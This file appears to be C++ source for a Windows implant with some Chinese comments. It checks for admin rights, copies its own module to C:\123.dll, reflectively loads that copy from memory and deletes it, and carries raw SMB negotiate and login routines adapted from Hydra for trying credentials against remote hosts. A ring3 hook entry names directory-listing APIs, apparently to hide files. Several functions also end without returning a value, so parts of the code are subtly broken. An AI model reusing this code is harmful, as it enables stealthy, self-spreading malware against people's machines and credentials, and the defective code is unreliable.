#include"include.h"
#include"MemoryModule.h"

bool check_target_info(TargetInfo &targetInfo)
{
	typedef LONG(__stdcall* fnRtlGetVersionEx)(LPOSVERSIONINFOEXA lpVersionInformation);
	fnRtlGetVersionEx pRtlGetVersion;
	HMODULE hNtdll;
	LONG ntStatus;
	OSVERSIONINFOEXA VersionInformation = { 0 };

	hNtdll = GetModuleHandle(L"ntdll.dll");
	if (hNtdll == NULL) return false;
	pRtlGetVersion = (fnRtlGetVersionEx)GetProcAddress(hNtdll, "RtlGetVersion");
	if (pRtlGetVersion == NULL) return false;
	VersionInformation.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
	ntStatus = pRtlGetVersion(&VersionInformation);
	if (ntStatus != 0) return false;

	targetInfo.dwMajorVersion = VersionInformation.dwMajorVersion;
	targetInfo.dwMinorVersion = VersionInformation.dwMinorVersion;

	typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

	LPFN_ISWOW64PROCESS
		fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
			GetModuleHandle(L"kernel32.dll"), "IsWow64Process");
	if (NULL != fnIsWow64Process)
	{
		if (!fnIsWow64Process(GetCurrentProcess(), &targetInfo.bIsWow64))
		{
			return false;
		}
	}

    //https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-osversioninfoexa
}

bool check_admin()
{
	BOOL bElevated = FALSE;	//是否管理员
	//1.得到自身进程的权限访问令牌
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
		return FALSE;
	//2.获取进程相关运行权限
	TOKEN_ELEVATION tokenEle;
	DWORD dwRetLen = 0;
	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen)) 	
	{
		//如果接受到的内存大小和结构体成正比例，代表接受完整的进程权限数据
		if (dwRetLen == sizeof(tokenEle)) 	
		{ 
			//取是否管理员布尔值
			bElevated = tokenEle.TokenIsElevated; 
		}
	}   	
	//关闭进程令牌
	CloseHandle(hToken);  	
	//返回是否OK
	return bElevated;
}

bool copy_self(wchar_t* dst)
{
	wchar_t path[MAX_PATH] = { 0 };
	HMODULE hModule = NULL;
	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)copy_self, &hModule);
	GetModuleFileNameW(hModule, path, sizeof(path));
	OutputDebugString(L"copy from:");
	OutputDebugString(path);
	HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING,
		FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}
	DWORD dwSize = GetFileSize(hFile, NULL);
	wchar_t fff[100] = { 0 };
	wsprintf(fff, L"%d", dwSize);
	OutputDebugString(fff);
	char *ptr = (char*)malloc(dwSize);
	DWORD bytes_read = 0;
	ReadFile(hFile, ptr, dwSize, &bytes_read, NULL);
	CloseHandle(hFile);
	if (dwSize != bytes_read)
	{
		free(ptr);
		return false;
	}
	hFile = CreateFile(dst, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, CREATE_ALWAYS,
		FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}
	WriteFile(hFile, ptr, dwSize, &bytes_read, NULL);
	CloseHandle(hFile);
	free(ptr);
}

int socket_connect(const char *host, int port, int protocol, int type)
{
	int s, ret = -1;
	int fail = 0;
	struct sockaddr_in target;
	if ((s = socket(PF_INET, protocol, type)) >= 0) {
		target.sin_port = htons(port);
		target.sin_family = AF_INET;
		target.sin_addr.S_un.S_addr = inet_addr(host);
		do {
			if (fail > 0) Sleep(1000);
			ret = connect(s, (struct sockaddr*)&target, sizeof(target));
			if (ret < 0) 
			{
				fail++;
			}
		} while (ret < 0 && fail <= 5);
		if (ret < 0 && fail > 5) {
			printf("DEBUG_CONNECT_UNREACHABLE\n");
			return -1;
		}
		ret = s;
		printf("DEBUG_CONNECT_OK\n");
		fail = 0;
	}
	return ret;
}

int socket_send(int socket, char* buf, int size, int options)
{
	return send(socket, buf, size, options);
}

int socket_recv(int socket, char* buf, int length)
{
	return recv(socket, buf, length, 0);
}

int socket_close(int socket)
{
	return closesocket(socket);
}

char* netbios_name(const char* orig) {
	int i, len;
	char* ret = (char*)malloc(40);

	memset(ret, 0, 40);
	len = strlen(orig);
	for (i = 0; i < 16; i++) {
		if (i >= len)
			strcat(ret, "CA");
		else {
			int odiv, omod;

			odiv = (orig[i] / 16) + 'A';
			omod = (orig[i] % 16) + 'A';
			ret[strlen(ret)] = odiv;
			ret[strlen(ret)] = omod;
		}
	}
	return(ret);
}

int smb_init(int s, char* name) {
	char* myname = netbios_name("HYDRA");
	char* hername = netbios_name(name);
	char buf[400];
	char buf1[] = { 0x81, 0x00, 0x00, 0x44, 0x20 };
	char buf2[] = { 0x00, 0x20 };
	char buf3[] = { 0x00 };
	char prot[] = { 0x00,0x00,
					  0x00, 0x89, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00,
					  0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00,
					  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
					  0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00,
					  0x00, 0x00, 0x00, 0x66, 0x00, 0x02, 0x50, 0x43,
					  0x20, 0x4E, 0x45, 0x54, 0x57, 0x4F, 0x52, 0x4B,
					  0x20, 0x50, 0x52, 0x4F, 0x47, 0x52, 0x41, 0x4D,
					  0x20, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4D, 0x49,
					  0x43, 0x52, 0x4F, 0x53, 0x4F, 0x46, 0x54, 0x20,
					  0x4E, 0x45, 0x54, 0x57, 0x4F, 0x52, 0x4B, 0x53,
					  0x20, 0x31, 0x2E, 0x30, 0x33, 0x00, 0x02, 0x4D,
					  0x49, 0x43, 0x52, 0x4F, 0x53, 0x4F, 0x46, 0x54,
					  0x20, 0x4E, 0x45, 0x54, 0x57, 0x4F, 0x52, 0x4B,
					  0x53, 0x20, 0x33, 0x2e, 0x30, 0x00, 0x02, 0x4c,
					  0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x31, 0x2e, 0x30,
					  0x00, 0x02, 0x4c, 0x4d, 0x31, 0x2e, 0x32, 0x58,
					  0x30, 0x30, 0x32, 0x00, 0x02, 0x53, 0x61, 0x6d,
					  0x62, 0x61, 0x00 };
	char* big;
	int pad = 0;

	big = (char*)malloc(sizeof(buf1) + strlen(hername) + sizeof(buf2) + strlen(myname)
		+ sizeof(buf3));
	memcpy(big, buf1, sizeof(buf1));
	pad += sizeof(buf1);
	memcpy(big + pad, hername, strlen(hername));
	pad += strlen(hername);
	memcpy(big + pad, buf2, sizeof(buf2));
	pad += sizeof(buf2);
	memcpy(big + pad, myname, strlen(myname));
	pad += strlen(myname);
	memcpy(big + pad, buf3, sizeof(buf3));
	pad += sizeof(buf3);

	socket_send(s, big, pad, 0);

	free(myname);
	free(hername);
	free(big);

	socket_recv(s, buf, sizeof(buf));
	if (buf[0] != 0x82)
		return -1;	/* failed */

	socket_send(s, prot, sizeof(prot), 0);

	socket_recv(s, buf, sizeof(buf));
	if (buf[9] == 0)
		return 0;	/* The remote host is willing to talk to us */
	else
		return -1;	/* failed */
}

int smb_login(int s, char* login, char* password) {
	int len = strlen(login) + strlen(password) + 57;
	int bcc = 2 + strlen(login) + strlen(password);
	int len_hi = len / 256, len_low = len % 256;
	int bcc_hi = bcc / 256, bcc_lo = bcc % 256;
	int pass_len = strlen(password) + 1;
	int pass_len_hi = pass_len / 256, pass_len_lo = pass_len % 256;

	u_char req[] = { 0x00,0x00,
					 0x00, 0x00, 0xFF, 0x53, 0x4D, 0x42, 0x73, 0x00,
				 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00,
				 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
				 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00,
				 0x00, 0x00, 0x0A, 0xFF, 0x00, 0x00, 0x00, 0x04,
				 0x11, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
				 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
				 0x00, 0x00 };
	char* t;
	char buf[2048];

	req[2] = len_hi;
	req[3] = len_low;
	req[51] = pass_len_lo;
	req[52] = pass_len_hi;
	req[57] = bcc_lo;
	req[58] = bcc_hi;

	t = (char*)malloc(len + 4);
	memset(t, 0, len + 4);

	memcpy(t, req, sizeof(req));
	memcpy(t + sizeof(req), password, strlen(password) + 1);
	memcpy(t + sizeof(req) + strlen(password) + 1, login, strlen(login) + 1);

	socket_send(s, t, sizeof(req) + strlen(password) + 1 + strlen(login) + 1, 0);
	free(t);
	socket_recv(s, buf, sizeof(buf));

	if ((buf[4] == 0xFF) && !buf[9])
		return 0;
	else
		return -1;
}

bool ring3_main_hook()
{
	OutputDebugString(L"create apihook thread!");
	//kernel32.dll	FindFirstFileW,FindNextFileW 
	//ntdll.dll		NtQueryDirectoryFile,ZwQueryDirectoryFile
	APIHOOK(0);
	/*HANDLE thread = CreateThread(0, 0, APIHOOK, 0, 0, 0);
	if (thread)
		WaitForSingleObject(thread, INFINITE);*/
	return true;
}

bool LoadFromMemory(void)
{
	wchar_t path[] = L"C:\\123.dll";
	wchar_t _path[MAX_PATH] = { 0 };
	HMODULE hModule = NULL;
	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)LoadFromMemory, &hModule);
	GetModuleFileNameW(hModule, _path, MAX_PATH);
	//第二次的时候，获取的是exe
	if (_path[wcslen(_path) -1] == 'e' || _path[wcslen(_path) - 1] == 'E') return true;

	copy_self(path);
	HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING,
		FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}
	DWORD dwSize = GetFileSize(hFile, NULL);
	char* ptr = (char*)malloc(dwSize);
	DWORD bytes_read = 0;
	ReadFile(hFile, ptr, dwSize, &bytes_read, NULL);
	CloseHandle(hFile);
	if (dwSize != bytes_read)
	{
		free(ptr);
		return false;
	}
	OutputDebugString(L"start to MemoryLoadLibrary function");
	HMEMORYMODULE handle = MemoryLoadLibrary(ptr, dwSize);
	if (handle == NULL)
	{
		OutputDebugString(L"Can't load library from memory");
		free(ptr);
		return false;
	}
	free(ptr);
	DeleteFile(path);
	return false;
}